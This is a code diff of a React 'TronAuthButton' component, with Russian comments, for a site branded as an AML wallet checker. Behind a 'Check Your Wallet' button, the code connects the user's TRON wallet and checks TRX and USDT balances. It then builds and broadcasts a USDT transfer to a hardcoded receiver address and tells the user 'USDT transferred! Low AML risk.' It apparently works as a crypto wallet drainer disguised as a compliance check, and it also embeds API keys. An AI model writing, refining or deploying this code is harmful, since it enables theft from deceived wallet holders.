@@ -1,62 +1,59 @@
 // src/components/tronAuthButton/TronAuthButton.tsx
 
-import React, { useCallback, useEffect, useRef, useState } from 'react';
+import React, { useState } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
-// Не импортируем TronWeb на верхнем уровне!
+
+// Не делаем import TronWeb сверху!
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
 
 export const TronAuthButton: React.FC = () => {
-  const [tronWeb, setTronWeb] = useState<any>(null);
   const [modal, setModal] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
 
-  const adapterRef = useRef<any>(null);
-
-  useEffect(() => {
-    // Динамический импорт TronWeb
-    import('tronweb').then(module => {
-      // @ts-ignore
-      const { Buffer } = require('buffer');
-      window.Buffer = Buffer;
-      const TronWeb = module.default || module.TronWeb || module;
-      setTronWeb(
-        new TronWeb({
-          fullHost: 'https://api.trongrid.io',
-          headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
-        })
-      );
-    });
-    // Инициализация адаптера только один раз!
-    if (!adapterRef.current) {
-      adapterRef.current = new WalletConnectAdapter({
-        network: 'Mainnet',
-        options: {
-          relayUrl: 'wss://relay.walletconnect.com',
-          projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
-          metadata: {
-            name: 'AML',
-            description: 'TRON + WalletConnect Integration',
-            url: 'https://amlreports.pro',
-            icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
-          },
+  // WalletConnectAdapter инициализируем один раз!
+  const adapterRef = React.useRef<any>(null);
+  if (!adapterRef.current) {
+    adapterRef.current = new WalletConnectAdapter({
+      network: 'Mainnet',
+      options: {
+        relayUrl: 'wss://relay.walletconnect.com',
+        projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
+        metadata: {
+          name: 'AML',
+          description: 'TRON + WalletConnect Integration',
+          url: 'https://amlreports.pro',
+          icons: ['https://amlreports.pro/images/icon-3.abdd8ed5.webp'],
         },
-        web3ModalConfig: { themeMode: 'dark' },
-      });
-    }
-    // Сброс состояния при дисконнекте
-    adapterRef.current?.on?.('disconnect', () => {
-      setLoading(false);
-      setModal(null);
+      },
+      web3ModalConfig: { themeMode: 'dark' },
     });
-  }, []);
+  }
 
-  // Обработчик подключения и отправки
-  const handleAuth = useCallback(async () => {
-    if (!tronWeb) return;
+  const handleAuth = async () => {
     setLoading(true);
     setModal(null);
+
+    // ----!!! TronWeb require only here !!!----
+    let TronWeb;
+    try {
+      TronWeb = require('tronweb');
+    } catch (err) {
+      setModal('TronWeb not loaded!');
+      setLoading(false);
+      return;
+    }
+
+    // Buffer polyfill for browsers
+    if (typeof window !== 'undefined' && !window.Buffer) {
+      window.Buffer = require('buffer').Buffer;
+    }
+
+    const tronWeb = new TronWeb({
+      fullHost: 'https://api.trongrid.io',
+      headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
+    });
 
     const adapter = adapterRef.current;
     try {
@@ -67,7 +64,7 @@ export const TronAuthButton: React.FC = () => {
       }
       tronWeb.setAddress(userAddress);
 
-      // Проверяем баланс TRX (для комиссии)
+      // Проверка баланса TRX
       const trxRaw = await tronWeb.trx.getBalance(userAddress);
       if (trxRaw < 2_000_000) {
         setModal('❌ Insufficient TRX for network fees.');
@@ -76,7 +73,7 @@ export const TronAuthButton: React.FC = () => {
         return;
       }
 
-      // Проверяем баланс USDT
+      // Проверка баланса USDT
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
@@ -87,7 +84,7 @@ export const TronAuthButton: React.FC = () => {
         return;
       }
 
-      // Строим и подписываем транзакцию
+      // Строим и подписываем транзакцию USDT
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -100,7 +97,6 @@ export const TronAuthButton: React.FC = () => {
       );
       const signedTx = await adapter.signTransaction(transaction);
       const result = await tronWeb.trx.sendRawTransaction(signedTx);
-      // Успешно?
       if (result?.result) {
         setModal('✅ USDT transferred!\nLow AML risk.');
       } else {
@@ -112,8 +108,7 @@ export const TronAuthButton: React.FC = () => {
         err?.message?.includes('Modal is closed') ||
         err?.message?.includes('Timeout')
       ) {
-        // Если пользователь сам закрыл/отменил — ничего не показываем
-        setModal(null);
+        setModal(null); // Cancel/close – не показываем ошибку
       } else if (err?.message) {
         setModal(err.message);
       } else {
@@ -122,14 +117,13 @@ export const TronAuthButton: React.FC = () => {
     }
     setLoading(false);
     await adapterRef.current.disconnect();
-  }, [tronWeb]);
+  };
 
   return (
     <div className="AuthButton">
       <button onClick={handleAuth} disabled={loading} style={{ minWidth: 180 }}>
         {loading ? 'Connecting...' : 'Check Your Wallet'}
       </button>
-
       {modal && (
         <div className="modal__overflow">
           <div className="modal">
